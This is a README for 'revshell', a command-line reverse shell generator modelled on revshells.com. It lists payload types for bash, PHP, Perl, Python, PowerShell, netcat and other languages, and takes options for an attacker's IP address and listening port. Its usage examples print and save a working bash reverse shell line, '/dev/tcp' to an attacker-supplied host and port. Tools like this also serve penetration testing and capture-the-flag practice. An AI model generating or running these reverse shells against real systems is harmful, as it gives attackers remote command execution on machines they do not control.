# revshell
A Reverse Shell Generator from CLI (Inspired from revshells.com).

## Usage:
```bash
usage: revshell.py [-h] --address IP_ADDRESS --port PORT [--output OUT_FILE]
                   {bash,php,php_one_liner,php_windows,perl,perl_windows,python,python2_windows,powershell,powershell_nishang,netcat,netcat_windows,netcat_windows_ps,lua,ruby,golang,awk}

                                    _          _ _
                 _ __ _____   _____| |__   ___| | |
                | '__/ _ \ \ / / __| '_ \ / _ \ | |
                | | |  __/\ V /\__ \ | | |  __/ | |
                |_|  \___| \_/ |___/_| |_|\___|_|_|
                                                by @TheFlash2k
revshell - A Reverse Shell Generator from the CLI - By @TheFlash2k

positional arguments:
  {bash,php,php_one_liner,php_windows,perl,perl_windows,python,python2_windows,powershell,powershell_nishang,netcat,netcat_windows,netcat_windows_ps,lua,ruby,golang,awk}
                        The type of reverse shell you want to generate.

optional arguments:
  -h, --help            show this help message and exit
  --address IP_ADDRESS, -i IP_ADDRESS
                        The Attacker's IP Address.
  --port PORT, -p PORT  The Attacker's Listening Port.
  --output OUT_FILE, -o OUT_FILE
                        The Output file name of the reverse shell
```

## Usage from CLI:
### Not storing the output to a file
```bash
$ python3 revshell.py bash -i 192.168.0.100 -p 9001
[*] Shell is:
=========================
bash -i >& /dev/tcp/192.168.0.100/9001 0>&1
=========================
```
### Storing the shell to a file:
```bash
$ python revshell.py bash -i 192.168.0.100 -p 9001 -o shell.sh
[+] Successfully Stored reverse shell to file shell.sh.
$ cat shell.sh
bash -i >& /dev/tcp/192.168.0.100/9001 0>&1
```
